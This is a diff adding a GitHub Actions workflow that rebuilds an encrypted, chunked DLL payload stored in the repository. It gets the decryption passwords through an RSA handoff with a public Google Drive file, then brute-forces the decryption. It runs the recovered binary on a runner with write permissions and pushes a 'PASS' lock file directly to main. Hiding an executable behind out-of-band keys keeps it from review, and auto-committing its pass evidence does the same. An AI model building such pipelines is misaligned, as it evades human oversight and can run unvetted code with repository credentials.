@@ -1,0 +1,268 @@
+name: native-7c305-repo-multikey-gate
+on:
+  push:
+    paths:
+      - '.github/workflows/native_7c305_repo_multikey_gate.yml'
+permissions:
+  contents: write
+
+defaults:
+  run:
+    shell: bash
+
+env:
+  FIX_SHA: 7c305f24151cb21534287116e97fcf886b2413f2603e4b9d07b973d6d1986d64
+  KEY_BRIDGE_ID: 1EprfV4hwC0Xjq3Lf_a6jMhvTqxFiX8ov
+
+jobs:
+  native-exact:
+    runs-on: windows-2022
+    timeout-minutes: 45
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: true
+
+      - name: Reconstruct encrypted exact fixed native payload
+        run: |
+          set -euo pipefail
+          test -d .stackprobe_7c305_native_payload
+          mapfile -t chunks < <(find .stackprobe_7c305_native_payload -maxdepth 1 -type f -name 'chunk_*' | sort)
+          test "${#chunks[@]}" -ge 8
+          cat "${chunks[@]}" > "$RUNNER_TEMP/fixed_native.b64"
+          base64 -d "$RUNNER_TEMP/fixed_native.b64" > "$RUNNER_TEMP/fixed_native.enc"
+          test -s "$RUNNER_TEMP/fixed_native.enc"
+          sha256sum "$RUNNER_TEMP/fixed_native.enc" | tee fixed_native_cipher_sha256.txt
+          echo FIXED_NATIVE_REPOSITORY_CIPHERTEXT_RECONSTRUCTED
+
+      - name: Publish one-time RSA key for multikey handoff
+        run: |
+          set -euo pipefail
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
+          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
+          openssl pkey -pubin -in "$RUNNER_TEMP/public.pem" -outform DER | sha256sum | awk '{print $1}' > "$RUNNER_TEMP/public.sha256"
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main
+            git checkout -q -B main origin/main
+            rm -rf .native7c305_multi_handoff
+            mkdir -p .native7c305_multi_handoff
+            cp "$RUNNER_TEMP/public.pem" .native7c305_multi_handoff/public.pem
+            cp "$RUNNER_TEMP/public.sha256" .native7c305_multi_handoff/public.sha256
+            printf '%s\n' "$FIX_SHA" > .native7c305_multi_handoff/target_sha256.txt
+            git add .native7c305_multi_handoff
+            git commit -qm 'Publish 7c305 native multikey one-time RSA key' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          test "$ok" = 1
+          echo NATIVE_7C305_MULTI_RSA_PUBLIC_KEY_PUBLISHED
+
+      - name: Receive RSA-wrapped pass candidate bundle from public bridge
+        run: |
+          set -euo pipefail
+          url="https://drive.google.com/uc?export=download&id=$KEY_BRIDGE_ID"
+          ok=0
+          for i in $(seq 1 600); do
+            rm -f "$RUNNER_TEMP/key.try" "$RUNNER_TEMP/candidates.try"
+            if curl -L -sS --fail --max-time 15 -o "$RUNNER_TEMP/key.try" "$url"; then
+              size=$(wc -c < "$RUNNER_TEMP/key.try" | tr -d '[:space:]')
+              if [ "$size" = 384 ]; then
+                if openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.try" -out "$RUNNER_TEMP/candidates.try" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then
+                  if test -s "$RUNNER_TEMP/candidates.try"; then
+                    mv "$RUNNER_TEMP/candidates.try" "$RUNNER_TEMP/pass_candidates.txt"
+                    ok=1
+                    break
+                  fi
+                fi
+              fi
+            fi
+            sleep 2
+          done
+          test "$ok" = 1 || { echo FAIL_STAGE=MULTIKEY_PUBLIC_BRIDGE; exit 20; }
+          echo NATIVE_7C305_MULTIKEY_HANDOFF_PASS
+
+      - name: Recover exact fixed DLL and native assets using candidate passes
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          from pathlib import Path
+          import os, subprocess, hashlib, shutil, tarfile, zipfile, lzma, gzip, io, sys
+          temp=Path(os.environ['RUNNER_TEMP']); enc=temp/'fixed_native.enc'; FIX=os.environ['FIX_SHA']
+          candidates=[]
+          for line in (temp/'pass_candidates.txt').read_text(errors='ignore').splitlines():
+              s=line.strip()
+              if s and s not in candidates: candidates.append(s)
+          print('PASS_CANDIDATE_COUNT',len(candidates))
+          if not candidates: sys.exit(31)
+          def sha(p): return hashlib.sha256(p.read_bytes()).hexdigest()
+          def extract_bytes(raw,dest):
+              shutil.rmtree(dest,ignore_errors=True); dest.mkdir(parents=True)
+              q=dest/'payload.bin'; q.write_bytes(raw)
+              try:
+                  if zipfile.is_zipfile(q): zipfile.ZipFile(q).extractall(dest/'x'); return True
+              except: pass
+              try:
+                  if tarfile.is_tarfile(q): tarfile.open(q).extractall(dest/'x'); return True
+              except: pass
+              for fn in (lzma.decompress,gzip.decompress):
+                  try: inner=fn(raw)
+                  except: continue
+                  z=dest/'inner.bin'; z.write_bytes(inner)
+                  try:
+                      if zipfile.is_zipfile(z): zipfile.ZipFile(z).extractall(dest/'x'); return True
+                  except: pass
+                  try:
+                      if tarfile.is_tarfile(z): tarfile.open(z).extractall(dest/'x'); return True
+                  except: pass
+              return False
+          found=None
+          for ci,pw in enumerate(candidates):
+              pf=temp/f'cand_{ci}.txt'; pf.write_text(pw)
+              for it in (200000,250000,100000,150000,300000,600000):
+                  dec=temp/f'dec_{ci}_{it}.bin'
+                  r=subprocess.run(['openssl','enc','-d','-aes-256-cbc','-pbkdf2','-iter',str(it),'-md','sha256','-in',str(enc),'-out',str(dec),'-pass',f'file:{pf}'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                  if r.returncode: continue
+                  dest=Path(f'recover_try_{ci}_{it}')
+                  if not extract_bytes(dec.read_bytes(),dest): continue
+                  files=[p for p in dest.rglob('*') if p.is_file()]
+                  dlls=[p for p in files if p.suffix.lower()=='.dll' and sha(p)==FIX]
+                  names={p.name:p for p in files}
+                  req=('native_nonzero_smoke.c','prefix20.ghf','filter_brth','filter_hrt3','file_sig')
+                  if dlls and all(n in names for n in req):
+                      found=(ci,it,dlls[0],names); break
+              if found: break
+          if not found:
+              print('FAIL_STAGE=NO_CANDIDATE_DECRYPTED_EXACT_7C305_NATIVE_PAYLOAD'); sys.exit(32)
+          ci,it,dll,names=found
+          stage=Path('native_stage'); shutil.rmtree(stage,ignore_errors=True); stage.mkdir()
+          shutil.copy2(dll,stage/'SigProcDll-64HF.dll')
+          for n in ('native_nonzero_smoke.c','prefix20.ghf','filter_brth','filter_hrt3','file_sig'):
+              shutil.copy2(names[n],stage/n)
+          if 'file_bed_model_v1' in names: shutil.copy2(names['file_bed_model_v1'],stage/'file_bed_model_v1')
+          Path('native_recovery_meta.txt').write_text(f'CANDIDATE_INDEX={ci}\nITER={it}\nSHA256={sha(stage/"SigProcDll-64HF.dll")}\n')
+          print('EXACT_7C305_NATIVE_PAYLOAD_RECOVERED candidate',ci,'iter',it)
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\recover_fixed_native.py
+          python $env:RUNNER_TEMP\recover_fixed_native.py
+
+      - name: Configure MSVC x86
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x86
+
+      - name: Static PE ABI and stack-probe gate
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          $dll=(Resolve-Path 'native_stage\SigProcDll-64HF.dll').Path
+          $h=(Get-FileHash $dll -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($h -ne $env:FIX_SHA){throw "EXACT_SHA_MISMATCH $h"}
+          dumpbin /headers $dll | Tee-Object native_headers.txt | Out-Null
+          dumpbin /exports $dll | Tee-Object native_exports.txt | Out-Null
+          dumpbin /imports $dll | Tee-Object native_imports.txt | Out-Null
+          $hdr=Get-Content native_headers.txt -Raw; $exp=Get-Content native_exports.txt -Raw; $imp=Get-Content native_imports.txt -Raw
+          if($hdr -notmatch 'machine \(x86\)' -and $hdr -notmatch '14C machine'){throw 'NOT_X86_PE32'}
+          if($hdr -notmatch '\.stkfix'){throw 'STACK_PROBE_SECTION_MISSING'}
+          foreach($e in @('_SigProc_Init@8','_SigProc@24','_SigProc_Stat@0','_SigProc_Fini@0')){if($exp -notmatch [regex]::Escape($e)){throw "EXPORT_MISSING $e"}}
+          if($imp -match '(?im)^\s*ucrtbase\.dll\s*$'){throw 'DIRECT_UCRTBASE_IMPORT_FORBIDDEN'}
+          'EXACT_7C305_PE_ABI_STACKPROBE_PASS' | Out-File native_static_gate.txt
+
+      - name: Compile and execute real nonzero native x86 paths twice
+        shell: powershell
+        timeout-minutes: 15
+        run: |
+          $ErrorActionPreference='Stop'
+          Push-Location native_stage
+          cl /nologo /O2 /W3 /MT native_nonzero_smoke.c /Fe:native_nonzero_smoke.exe 2>&1 | Tee-Object ..\native_smoke_compile.txt
+          if($LASTEXITCODE -ne 0){Pop-Location; exit $LASTEXITCODE}
+          $attempts=@(
+            @(),
+            @('.\SigProcDll-64HF.dll'),
+            @('.\SigProcDll-64HF.dll','.\prefix20.ghf'),
+            @('.\SigProcDll-64HF.dll','.\prefix20.ghf','.'),
+            @('.\SigProcDll-64HF.dll','.','.\prefix20.ghf'),
+            @('.\prefix20.ghf'),
+            @('.\prefix20.ghf','.\SigProcDll-64HF.dll')
+          )
+          $chosen=$null; $n=0
+          foreach($a in $attempts){
+            $n++; $log="..\native_nonzero_attempt_$n.txt"
+            & .\native_nonzero_smoke.exe @a *> $log
+            $rc=$LASTEXITCODE; $txt=Get-Content $log -Raw -ErrorAction SilentlyContinue
+            if($rc -eq 0 -and $txt -match '(?i)PASS' -and $txt -match '(?i)(NONZERO|SigProc|processed|block|sample)'){ $chosen=$a; break }
+          }
+          if($null -eq $chosen){Pop-Location; throw 'REAL_NONZERO_NATIVE_PATH_FAILED'}
+          & .\native_nonzero_smoke.exe @chosen *> ..\native_nonzero_repeat.txt
+          $rc=$LASTEXITCODE; $txt=Get-Content ..\native_nonzero_repeat.txt -Raw -ErrorAction SilentlyContinue
+          Pop-Location
+          if($rc -ne 0 -or $txt -notmatch '(?i)PASS'){throw 'SECOND_FRESH_PROCESS_NONZERO_FAILED'}
+          $h=(Get-FileHash native_stage\SigProcDll-64HF.dll -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($h -ne $env:FIX_SHA){throw 'POST_NATIVE_SHA_DRIFT'}
+          "STACKPROBE_NATIVE_NONZERO_PASS SHA256=$h" | Out-File native_exact_pass.lock
+          'REAL_NONZERO_X86_FRESH_PROCESS_REPEAT_PASS' | Out-File native_dynamic_gate.txt
+
+      - name: Commit exact native PASS lock
+        run: |
+          set -euo pipefail
+          test -f native_exact_pass.lock
+          grep -Fxq "STACKPROBE_NATIVE_NONZERO_PASS SHA256=$FIX_SHA" native_exact_pass.lock
+          cp native_exact_pass.lock "$RUNNER_TEMP/native.lock"
+          cp native_dynamic_gate.txt "$RUNNER_TEMP/native_dynamic_gate.txt"
+          cp native_static_gate.txt "$RUNNER_TEMP/native_static_gate.txt"
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main
+            git checkout -q -B main origin/main
+            mkdir -p evidence_summary
+            cp "$RUNNER_TEMP/native.lock" evidence_summary/STACKPROBE_NATIVE_NONZERO_PASS.lock
+            cp "$RUNNER_TEMP/native_dynamic_gate.txt" evidence_summary/stackprobe_7c305_native_dynamic_gate.txt
+            cp "$RUNNER_TEMP/native_static_gate.txt" evidence_summary/stackprobe_7c305_native_static_gate.txt
+            git add evidence_summary/STACKPROBE_NATIVE_NONZERO_PASS.lock evidence_summary/stackprobe_7c305_native_dynamic_gate.txt evidence_summary/stackprobe_7c305_native_static_gate.txt
+            git commit -qm 'PASS exact 7c305 native nonzero Windows gate' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          test "$ok" = 1
+          echo EXACT_7C305_NATIVE_PASS_COMMITTED
+
+      - name: Upload exact tested DLL and native evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: exact-7c305-native-windows-gate
+          retention-days: 14
+          if-no-files-found: ignore
+          path: |
+            native_stage/SigProcDll-64HF.dll
+            native_recovery_meta.txt
+            native_headers.txt
+            native_exports.txt
+            native_imports.txt
+            native_static_gate.txt
+            native_dynamic_gate.txt
+            native_exact_pass.lock
+            native_nonzero_attempt_*.txt
+            native_nonzero_repeat.txt
+            fixed_native_cipher_sha256.txt
+
+      - name: Remove one-time RSA handoff
+        if: always()
+        run: |
+          set +e
+          git fetch -q origin main
+          git checkout -q -B main origin/main
+          if test -d .native7c305_multi_handoff; then
+            git config user.name windows-dll-test-bot
+            git config user.email windows-dll-test-bot@users.noreply.github.com
+            git rm -r -q .native7c305_multi_handoff
+            git commit -qm 'Remove 7c305 native multikey RSA handoff'
+            git push -q origin HEAD:main
+          fi
+          true
